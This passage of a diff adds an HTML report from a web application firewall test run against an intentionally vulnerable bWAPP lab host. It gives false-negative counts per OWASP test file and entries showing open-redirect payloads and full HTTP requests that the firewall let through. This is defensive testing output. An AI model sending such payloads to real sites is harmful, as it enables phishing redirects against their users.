@@ -1,0 +1,4078 @@
+<!DOCTYPE html>
+<HTML>
+	<HEAD>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta charset="utf-8">
+		<TITLE>WAF Testing report</TITLE>
+		<style>
+#main-div {
+    font-family: "Myriad Pro", "Segoe UI", Arial, sans-serif;
+    font-size: 12px;
+    align-content: center;
+    display: block;
+    width: 900px;
+    margin: 0 auto;
+    padding-right: 30px;
+    padding-left: 30px;
+}
+
+h1 {
+    font-size: 24px;
+    text-transform: capitalize;
+    font-weight: normal;
+    margin: 0;
+    color: #1D1D1B;
+}
+
+h2 {
+    font-size: 24px;
+    margin-top: 33px;
+    margin-bottom: 15px;
+    color: #10110F;
+    -webkit-margin-before: 1em;
+    -webkit-margin-after: 1em;
+}
+
+    h2 sub {
+        padding-left: 1px;
+        font-size: 12px;
+        font-weight: normal;
+        vertical-align: bottom;
+        position: absolute;
+        display: block;
+        color: #676767;
+    }
+
+h3 {
+    font-size: 16px;
+    margin-top: 0px;
+    margin-bottom: 5px;
+    font-family: "Myriad Pro Semibold", "Segoe UI Semibold", "Arial Semibold", "sans-serif semibold";
+}
+
+h4 {
+    font-size: 14px;
+    font-family: "Myriad Pro Semibold", "Segoe UI Semibold", "Arial Semibold", "sans-serif semibold";
+    -webkit-margin-before: 1em;
+    -webkit-margin-after: 1em;
+}
+
+h5 {
+    font-family: "Myriad Pro", "Segoe UI", Arial, sans-serif;
+    font-size: 12px;
+    font-family: normal;
+    margin: 0px;
+    -webkit-margin-before: 1em;
+    -webkit-margin-after: 1em;
+}
+
+h3.error-header {
+    color: #BD1622;
+    padding-bottom: 0px;
+}
+
+span.semibold {
+    font-weight: bold;
+    font-family: "Myriad Pro Semibold", "Segoe UI Semibold", "Arial Semibold", "sans-serif semibold";
+}
+
+mark.attantion {
+    color: #BD1622;
+    background: transparent;
+}
+
+a {
+    color: #009EE2;
+}
+
+    a.external-link:after {
+        content: " " url(data:image/svg+xml;base64,PCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4NCjxzdmcgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCINCgkgd2lkdGg9IjEwcHgiIGhlaWdodD0iMTBweCIgdmlld0JveD0iMCAwIDUxMS42MjYgNTExLjYyNyIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgNTExLjYyNiA1MTEuNjI3O2ZpbGw6IzAwOUVFMjsiDQoJIHhtbDpzcGFjZT0icHJlc2VydmUiPg0KPGc+DQoJPGc+DQoJCTxwYXRoIGQ9Ik0zOTIuODU3LDI5Mi4zNTRoLTE4LjI3NGMtMi42NjksMC00Ljg1OSwwLjg1NS02LjU2MywyLjU3M2MtMS43MTgsMS43MDgtMi41NzMsMy44OTctMi41NzMsNi41NjN2OTEuMzYxDQoJCQljMCwxMi41NjMtNC40NywyMy4zMTUtMTMuNDE1LDMyLjI2MmMtOC45NDUsOC45NDUtMTkuNzAxLDEzLjQxNC0zMi4yNjQsMTMuNDE0SDgyLjIyNGMtMTIuNTYyLDAtMjMuMzE3LTQuNDY5LTMyLjI2NC0xMy40MTQNCgkJCWMtOC45NDUtOC45NDYtMTMuNDE3LTE5LjY5OC0xMy40MTctMzIuMjYyVjE1NS4zMWMwLTEyLjU2Miw0LjQ3MS0yMy4zMTMsMTMuNDE3LTMyLjI1OWM4Ljk0Ny04Ljk0NywxOS43MDItMTMuNDE4LDMyLjI2NC0xMy40MTgNCgkJCWgyMDAuOTk0YzIuNjY5LDAsNC44NTktMC44NTksNi41Ny0yLjU3YzEuNzExLTEuNzEzLDIuNTY2LTMuOSwyLjU2Ni02LjU2N1Y4Mi4yMjFjMC0yLjY2Mi0wLjg1NS00Ljg1My0yLjU2Ni02LjU2Mw0KCQkJYy0xLjcxMS0xLjcxMy0zLjkwMS0yLjU2OC02LjU3LTIuNTY4SDgyLjIyNGMtMjIuNjQ4LDAtNDIuMDE2LDguMDQyLTU4LjEwMiwyNC4xMjVDOC4wNDIsMTEzLjI5NywwLDEzMi42NjUsMCwxNTUuMzEzdjIzNy41NDINCgkJCWMwLDIyLjY0Nyw4LjA0Miw0Mi4wMTgsMjQuMTIzLDU4LjA5NWMxNi4wODYsMTYuMDg0LDM1LjQ1NCwyNC4xMyw1OC4xMDIsMjQuMTNoMjM3LjU0M2MyMi42NDcsMCw0Mi4wMTctOC4wNDYsNTguMTAxLTI0LjEzDQoJCQljMTYuMDg1LTE2LjA3NywyNC4xMjctMzUuNDQ3LDI0LjEyNy01OC4wOTV2LTkxLjM1OGMwLTIuNjY5LTAuODU2LTQuODU5LTIuNTc0LTYuNTcNCgkJCUMzOTcuNzA5LDI5My4yMDksMzk1LjUxOSwyOTIuMzU0LDM5Mi44NTcsMjkyLjM1NHoiLz4NCgkJPHBhdGggZD0iTTUwNi4xOTksNDEuOTcxYy0zLjYxNy0zLjYxNy03LjkwNS01LjQyNC0xMi44NS01LjQyNEgzNDcuMTcxYy00Ljk0OCwwLTkuMjMzLDEuODA3LTEyLjg0Nyw1LjQyNA0KCQkJYy0zLjYxNywzLjYxNS01LjQyOCw3Ljg5OC01LjQyOCwxMi44NDdzMS44MTEsOS4yMzMsNS40MjgsMTIuODVsNTAuMjQ3LDUwLjI0OEwxOTguNDI0LDMwNC4wNjcNCgkJCWMtMS45MDYsMS45MDMtMi44NTYsNC4wOTMtMi44NTYsNi41NjNjMCwyLjQ3OSwwLjk1Myw0LjY2OCwyLjg1Niw2LjU3MWwzMi41NDgsMzIuNTQ0YzEuOTAzLDEuOTAzLDQuMDkzLDIuODUyLDYuNTY3LDIuODUyDQoJCQlzNC42NjUtMC45NDgsNi41NjctMi44NTJsMTg2LjE0OC0xODYuMTQ4bDUwLjI1MSw1MC4yNDhjMy42MTQsMy42MTcsNy44OTgsNS40MjYsMTIuODQ3LDUuNDI2czkuMjMzLTEuODA5LDEyLjg1MS01LjQyNg0KCQkJYzMuNjE3LTMuNjE2LDUuNDI0LTcuODk4LDUuNDI0LTEyLjg0N1Y1NC44MThDNTExLjYyNiw0OS44NjYsNTA5LjgxMyw0NS41ODYsNTA2LjE5OSw0MS45NzF6Ii8+DQoJPC9nPg0KPC9nPg0KPC9zdmc+DQo=);
+    }
+
+table {
+    margin: 0px;
+    border-spacing: 0px;
+}
+
+td > sub {
+    padding-left: 1px;
+    font-weight: normal;
+    vertical-align: bottom;
+    display: block;
+    color: #676767;
+}
+
+td.option-description {
+    color: #575756;
+    font-weight: normal;
+    white-space: nowrap;
+    padding: 0px 50px;
+    padding-left: 0;
+    padding-top: 0;
+    vertical-align: top;
+    text-align: left;
+}
+
+    td.option-description:after {
+        content: ":";
+    }
+
+td.option-value {
+    color: #3C3C3B;
+    vertical-align: top;
+    padding-right: 11px;
+    text-align: left;
+    font-family: monospace;
+    word-break: break-all;
+    max-height: 400px;
+    text-overflow: ellipsis;
+}
+
+td.option-value {
+    color: #3C3C3B;
+    vertical-align: top;
+    padding-right: 11px;
+    text-align: left;
+    font-family: monospace;
+    word-break: break-all;
+    max-height: 400px;
+    text-overflow: ellipsis;
+}
+
+    td.option-value pre {
+        white-space: pre-wrap;
+        white-space: -moz-pre-wrap;
+        white-space: -pre-wrap;
+        white-space: -o-pre-wrap;
+        word-wrap: break-word;
+        padding: 0px;
+        margin: 0px;
+        display: block;
+    }
+
+td.option-value-semibold pre {
+    white-space: pre-wrap;
+    white-space: -moz-pre-wrap;
+    white-space: -pre-wrap;
+    white-space: -o-pre-wrap;
+    word-wrap: break-word;
+    padding: 0px;
+    margin: 0px;
+    display: block;
+}
+
+td.option-value pre.with-max-height {
+    white-space: pre-wrap;
+    white-space: -moz-pre-wrap;
+    white-space: -pre-wrap;
+    white-space: -o-pre-wrap;
+    word-wrap: break-word;
+    padding: 0px;
+    margin: 0px;
+    display: block;
+    display: -webkit-box;
+    -webkit-line-clamp: 15;
+    -webkit-box-orient: vertical;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+
+td.option-value-semibold {
+    font-family: "Myriad Pro Semibold", "Segoe UI Semibold", "Arial Semibold", "sans-serif semibold";
+    font-weight: bold;
+    word-break: break-all;
+}
+
+table.options-table {
+    padding-top: 0px;
+}
+
+.meter {
+    height: 12px;
+    position: relative;
+    background: none;
+}
+
+    .meter > span {
+        -webkit-print-color-adjust: exact;
+        print-color-adjust: exact;
+        display: block;
+        height: 100%;
+        background-color: #999999;
+        position: relative;
+        overflow: hidden;
+        min-width: 4px;
+    }
+
+        .meter > span[style*=width:0%] {
+            min-width: 0px;
+        }
+
+        .meter > span.level-high {
+            background-color: #F98A73;
+        }
+
+        .meter > span.level-medium {
+            background-color: #F9BF51;
+        }
+
+        .meter > span.level-low {
+            background-color: #66CB93;
+        }
+
+        .meter > span.level-pattern {
+            background-color: #A9C1E3;
+        }
+
+#report-header-section {
+    margin-left: 80px;
+    margin-top: 35px;
+    position: relative;
+}
+
+#scan-time {
+    position: absolute;
+    top: 1px;
+    right: 0;
+    font-family: "Myriad Pro Semibold", "Segoe UI Semibold", "Tahoma Semibold";
+}
+
+#scan-info {
+    margin-top: 10px;
+    padding-right: 30px;
+    padding-left: 80px;
+    padding-top: 15px;
+    padding-bottom: 15px;
+    background: #ECECEC;
+}
+
+#statistic > div {
+    padding-left: 80px;
+}
+
+#statistic .scan-statistics {
+    border-spacing: 0px 5px;
+    width: 100%;
+}
+
+#statistic .root-scan-statistics {
+    margin-top: 15px;
+}
+
+#statistic .scan-statistics td {
+    padding: 0;
+    display: table-cell;
+    align-content: center;
+    padding-right: 12px;
+    padding-top: 2px;
+    padding-bottom: 2px;
+}
+
+#statistic .scan-statistics table {
+    page-break-inside: auto;
+}
+
+#statistic .scan-statistics tr {
+    page-break-inside: avoid;
+}
+
+.scan-statistics td.level-name {
+    width: 250px;
+}
+
+.scan-statistics td.level-count {
+    width: 1px;
+    padding-right: 10px;
+    text-align: left;
+}
+
+.scan-statistics td.level-chart {
+    padding: 0;
+}
+
+#attacks-section {
+    display: block;
+    margin-top: 30px;
+    page-break-before: always;
+}
+
+    #attacks-section > h2 {
+        margin-left: 80px;
+        page-break-inside: avoid;
+    }
+
+    #attacks-section > h3 {
+        margin-left: 81px;
+        font-size: 20px;
+        margin-bottom: 10px;
+        margin-top: 35px;
+        page-break-before: auto;
+        page-break-after: avoid;
+        page-break-inside: avoid;
+    }
+
+    #attacks-section .attack {
+        margin-bottom: 15px;
+        display: block;
+    }
+
+    #attacks-section .attack-header {
+        page-break-inside: avoid !important;
+        page-break-after: avoid !important;
+        background-color: #ECECEC;
+    }
+
+    #attacks-section .attack-body {
+        page-break-before: avoid !important;
+    }
+
+
+
+    #attacks-section .attack-main-info {
+        display: inline-block;
+        width: 90%;
+        margin-left: -7px;
+    }
+
+    #attacks-section .attack-level {
+        display: inline-block;
+        width: 80px;
+        text-align: center;
+        vertical-align: top;
+        margin-top: 4px;
+        font-size: 10px;
+    }
+
+    #attacks-section .attack-type-name- {
+        display: inline-block;
+        position: relative;
+        background-color: #3D3D3B;
+        width: 70%;
+        padding: 1px 10px;
+        color: white;
+        margin-left: -12px;
+        font-size: 14px;
+    }
+
+    #attacks-section .attack-type-name-level-high {
+        display: inline-block;
+        position: relative;
+        background-color: #F98A73;
+        width: 70%;
+        padding: 1px 10px;
+        color: white;
+        -webkit-print-color-adjust: exact;
+        print-color-adjust: exact;
+        margin-left: -10px;
+        font-size: 14px;
+    }
+
+    #attacks-section .attack-type-name-level-medium {
+        display: inline-block;
+        position: relative;
+        background-color: #F9BF51;
+        width: 70%;
+        padding: 1px 10px;
+        color: white;
+        -webkit-print-color-adjust: exact;
+        print-color-adjust: exact;
+        margin-left: -12px;
+        font-size: 14px;
+    }
+
+    #attacks-section .attack-type-name-level-low {
+        display: inline-block;
+        position: relative;
+        background-color: #66CB93;
+        width: 70%;
+        padding: 1px 10px;
+        color: white;
+        -webkit-print-color-adjust: exact;
+        print-color-adjust: exact;
+        margin-left: -12px;
+        font-size: 14px;
+    }
+
+    #attacks-section .attack-type-name-level-pattern {
+        display: inline-block;
+        position: relative;
+        background-color: #A9C1E3;
+        width: 70%;
+        padding: 1px 10px;
+        color: white;
+        -webkit-print-color-adjust: exact;
+        print-color-adjust: exact;
+        font-size: 14px;
+        margin-left: 2px;
+    }
+
+    #attacks-section .attack-statuses {
+        width: 79px;
+        opacity: 1;
+        display: block;
+    }
+
+    #attacks-section .attack-statuses-cell {
+        text-align: center;
+        padding: 0px;
+        height: 100%;
+        align-content: stretch;
+        vertical-align: top;
+        padding-top: 10px;
+    }
+
+
+    #attacks-section .attack-info {
+        position: relative;
+        margin-top: 0px;
+        border-top-width: 1px;
+        border-top-style: dashed;
+        border-top-color: #CACACA;
+        padding-bottom: 5px;
+        background-color: #ECECEC;
+    }
+
+    #attacks-section .attack-header .attack-info {
+        position: relative;
+        margin-top: 0px;
+        border-top-width: 0px;
+    }
+
+    #attacks-section .attack-info:last-child {
+        border-bottom-width: 0px;
+        padding-bottom: 10px;
+        page-break-after: auto;
+    }
+
+    #attacks-section .attack-root-table {
+        table-layout: fixed;
+        width: 100%;
+        display: block;
+        page-break-inside: avoid;
+        margin-left: -4px;
+    }
+
+    #attacks-section .attack-detail-info {
+        border-spacing: 0px;
+        margin-top: 5px;
+    }
+
+
+    #attacks-section .option-description {
+        width: 130px;
+        padding-right: 10px;
+        word-wrap: break-word;
+        padding-bottom: 5px;
+        white-space: pre-wrap;
+    }
+
+
+
+    #attacks-section a.attack-description-link {
+        float: right;
+        font-size: 12px;
+        margin-top: 4px;
+    }
+
+@media print {
+
+    .attack-description-link {
+        display: none;
+    }
+
+    a.external-link:after {
+        content: "";
+    }
+
+    #attacks-section .attack {
+        margin-bottom: 35px;
+    }
+
+    #attacks-section .attack-header {
+        background-color: transparent;
+        border-left-width: 1px;
+        border-left-style: solid;
+        border-left-color: #CACACA;
+    }
+
+        #attacks-section .attack-header .attack-info {
+            background-color: transparent;
+        }
+
+
+    #attacks-section .attack-body .attack-info {
+        background-color: transparent;
+        border-left-width: 1px;
+        border-left-style: solid;
+        border-left-color: #CACACA;
+    }
+}
+
+		</style>
+	</HEAD>
+	<BODY>
+		<div id="main-div">
+			<div id="report-header-section">
+				<h1>WAF Testing Report</h1>
+				<div id="scan-time">
+					<h1>16 August 2016 17:43:01</h1>
+				</div>
+			</div>
+
+			<div id="scan-info">
+				<h3 class="error-header"></h3>
+				<table class="options-table">
+					<tr>
+						<td class="option-description">Host</td>
+						<td class="option-value-semibold">
+						<a class="external-link" target="blank" href="http://172.16.9.69">http://172.16.9.69</a>
+						</td>
+					</tr>
+					<tr>
+						<td class="option-description">Files checked</td>
+						<td class="option-value-semibold">
+						
+							
+						
+							
+								owasp/OWASP_A1.json<br/>
+							
+						
+							
+								owasp/OWASP_A10.json<br/>
+							
+						
+							
+								owasp/OWASP_A3.json<br/>
+							
+						
+							
+								owasp/OWASP_A4.json<br/>
+							
+						
+							
+								owasp/OWASP_A5.json<br/>
+							
+						
+							
+								owasp/OWASP_A6.json<br/>
+							
+						
+							
+								owasp/OWASP_A7.json<br/>
+							
+						
+							
+								owasp/OWASP_A8.json<br/>
+							
+						
+							
+								owasp/OWASP_A9.json<br/>
+							
+						
+						</td>
+					</tr>
+				</table>
+			</div>
+			
+		<div id="statistic">
+
+		
+			<div class="root-scan-statistics">
+			
+				<h3>Total</h3>
+      
+				<table class="scan-statistics">
+					<tr>
+						<td class="level-name">False-Negative</td>
+						<td class="level-count">38</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-high" style="&#xA;width:50.0%&#xA"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">False-Positive</td>
+						<td class="level-count">0</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-medium" style="&#xA;width:0.0%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">Total</td>
+						<td class="level-count">76</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-low" style="&#xA;width:100%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+				</table>
+			</div>
+		
+			<div class="root-scan-statistics">
+			
+				<h3>File: owasp/OWASP_A1.json</h3>
+      
+				<table class="scan-statistics">
+					<tr>
+						<td class="level-name">False-Negative</td>
+						<td class="level-count">17</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-high" style="&#xA;width:51.5151515152%&#xA"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">False-Positive</td>
+						<td class="level-count">0</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-medium" style="&#xA;width:0.0%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">Total</td>
+						<td class="level-count">33</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-low" style="&#xA;width:100%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+				</table>
+			</div>
+		
+			<div class="root-scan-statistics">
+			
+				<h3>File: owasp/OWASP_A10.json</h3>
+      
+				<table class="scan-statistics">
+					<tr>
+						<td class="level-name">False-Negative</td>
+						<td class="level-count">3</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-high" style="&#xA;width:100.0%&#xA"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">False-Positive</td>
+						<td class="level-count">0</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-medium" style="&#xA;width:0.0%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">Total</td>
+						<td class="level-count">3</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-low" style="&#xA;width:100%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+				</table>
+			</div>
+		
+			<div class="root-scan-statistics">
+			
+				<h3>File: owasp/OWASP_A3.json</h3>
+      
+				<table class="scan-statistics">
+					<tr>
+						<td class="level-name">False-Negative</td>
+						<td class="level-count">9</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-high" style="&#xA;width:52.9411764706%&#xA"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">False-Positive</td>
+						<td class="level-count">0</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-medium" style="&#xA;width:0.0%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">Total</td>
+						<td class="level-count">17</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-low" style="&#xA;width:100%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+				</table>
+			</div>
+		
+			<div class="root-scan-statistics">
+			
+				<h3>File: owasp/OWASP_A4.json</h3>
+      
+				<table class="scan-statistics">
+					<tr>
+						<td class="level-name">False-Negative</td>
+						<td class="level-count">2</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-high" style="&#xA;width:100.0%&#xA"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">False-Positive</td>
+						<td class="level-count">0</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-medium" style="&#xA;width:0.0%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">Total</td>
+						<td class="level-count">2</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-low" style="&#xA;width:100%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+				</table>
+			</div>
+		
+			<div class="root-scan-statistics">
+			
+				<h3>File: owasp/OWASP_A5.json</h3>
+      
+				<table class="scan-statistics">
+					<tr>
+						<td class="level-name">False-Negative</td>
+						<td class="level-count">1</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-high" style="&#xA;width:33.3333333333%&#xA"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">False-Positive</td>
+						<td class="level-count">0</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-medium" style="&#xA;width:0.0%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">Total</td>
+						<td class="level-count">3</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-low" style="&#xA;width:100%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+				</table>
+			</div>
+		
+			<div class="root-scan-statistics">
+			
+				<h3>File: owasp/OWASP_A6.json</h3>
+      
+				<table class="scan-statistics">
+					<tr>
+						<td class="level-name">False-Negative</td>
+						<td class="level-count">1</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-high" style="&#xA;width:33.3333333333%&#xA"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">False-Positive</td>
+						<td class="level-count">0</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-medium" style="&#xA;width:0.0%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">Total</td>
+						<td class="level-count">3</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-low" style="&#xA;width:100%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+				</table>
+			</div>
+		
+			<div class="root-scan-statistics">
+			
+				<h3>File: owasp/OWASP_A7.json</h3>
+      
+				<table class="scan-statistics">
+					<tr>
+						<td class="level-name">False-Negative</td>
+						<td class="level-count">0</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-high" style="&#xA;width:0.0%&#xA"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">False-Positive</td>
+						<td class="level-count">0</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-medium" style="&#xA;width:0.0%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">Total</td>
+						<td class="level-count">7</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-low" style="&#xA;width:100%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+				</table>
+			</div>
+		
+			<div class="root-scan-statistics">
+			
+				<h3>File: owasp/OWASP_A8.json</h3>
+      
+				<table class="scan-statistics">
+					<tr>
+						<td class="level-name">False-Negative</td>
+						<td class="level-count">3</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-high" style="&#xA;width:100.0%&#xA"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">False-Positive</td>
+						<td class="level-count">0</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-medium" style="&#xA;width:0.0%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">Total</td>
+						<td class="level-count">3</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-low" style="&#xA;width:100%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+				</table>
+			</div>
+		
+			<div class="root-scan-statistics">
+			
+				<h3>File: owasp/OWASP_A9.json</h3>
+      
+				<table class="scan-statistics">
+					<tr>
+						<td class="level-name">False-Negative</td>
+						<td class="level-count">2</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-high" style="&#xA;width:40.0%&#xA"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">False-Positive</td>
+						<td class="level-count">0</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-medium" style="&#xA;width:0.0%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+					<tr>
+						<td class="level-name">Total</td>
+						<td class="level-count">5</td>
+						<td class="level-chart">
+							<div class="meter">
+								<span class="level-low" style="&#xA;width:100%&#xA;"></span>
+							</div>
+						</td>
+					</tr>
+				</table>
+			</div>
+		
+			
+		</div>
+		<div id="attacks-section">
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A10_01</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A10_01</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>Unvalidated Redirects & Forwards</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A10.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/unvalidated_redir_fwd_1.php?url=http://www.itsecgames.com</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>url=http://www.itsecgames.com</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/unvalidated_redir_fwd_1.php?url=http://www.itsecgames.com HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A10_01</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A10_01</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>Unvalidated Redirects & Forwards</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A10.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/unvalidated_redir_fwd_1.php?url=http://www.itsecgames.com</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>url=http://www.itsecgames.com</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/unvalidated_redir_fwd_1.php?url=http://www.itsecgames.com HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A10_01</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A10_01</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>Unvalidated Redirects & Forwards</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A10.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/unvalidated_redir_fwd_2.php?ReturnUrl=http://www.itsecgames.com</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
